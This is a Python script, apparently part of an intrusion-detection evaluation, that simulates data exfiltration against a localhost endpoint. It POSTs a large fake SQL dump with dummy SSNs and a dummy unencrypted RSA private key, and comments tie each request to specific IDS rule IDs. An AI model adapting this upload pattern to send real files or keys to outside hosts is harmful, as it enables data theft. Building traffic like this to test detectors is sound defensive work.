import sys
import time
import urllib.request
import urllib.error


def run_data_exfil(target_url: str = "http://127.0.0.1:8080/upload", interval: float = 0.2):
    """Table II Scenario 6: Large HTTP POST (> 5,000 B) + unencrypted RSA private key upload."""
    print(f"\n[*] [ATTACK 6] Starting Data Exfiltration Simulation against {target_url}...")
    results = []

    # 1. Oversized HTTP POST (> 5,000 B) matching sid:1000050 (`filename=` in body + >5000 B)
    sql_rows = "INSERT INTO users VALUES (1, '000-11-2222', 150000);\n" * 120
    large_body = (
        "filename=customer_database_2026.sql&data="
        "CREATE TABLE users (id INT, ssn VARCHAR(11), salary INT);\n"
        + sql_rows
    ).encode("utf-8")
    assert len(large_body) > 5000, f"Table II requires POST > 5000 B, got {len(large_body)}"
    print(f"    [EXFIL 1] Transferring database backup ({len(large_body)} bytes > 5,000 B)...")
    try:
        req = urllib.request.Request(
            f"{target_url}?filename=customer_database_2026.sql",
            data=large_body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as resp:
            code = resp.getcode()
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception as e:
        code = f"DROPPED/ERR ({e})"
    print(f"    [+] Database backup POST result: HTTP {code}")
    results.append(("large_post", code))

    if interval > 0:
        time.sleep(interval)

    # 2. Unencrypted RSA Private Key exfiltration (sid:1000052)
    print("    [EXFIL 2] Exfiltrating unencrypted RSA private key...")
    rsa_key_payload = (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEA0Y3wVq28h9c8w0t7yF2x9J7qL8m2k5v9w3x7y8z9a0b1c2d3\n"
        "e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5\n"
        "-----END RSA PRIVATE KEY-----\n"
    ).encode("utf-8")
    try:
        req = urllib.request.Request(
            f"{target_url}?file=id_rsa",
            data=rsa_key_payload,
            headers={"Content-Type": "text/plain"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as resp:
            code = resp.getcode()
    except urllib.error.HTTPError as e:
        code = e.code
    except Exception as e:
        code = f"DROPPED/ERR ({e})"
    print(f"    [+] RSA Private Key POST result: HTTP {code}")
    results.append(("rsa_key", code))

    print("[+] Data exfiltration simulation complete.\n")
    return results


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/upload"
    run_data_exfil(url)
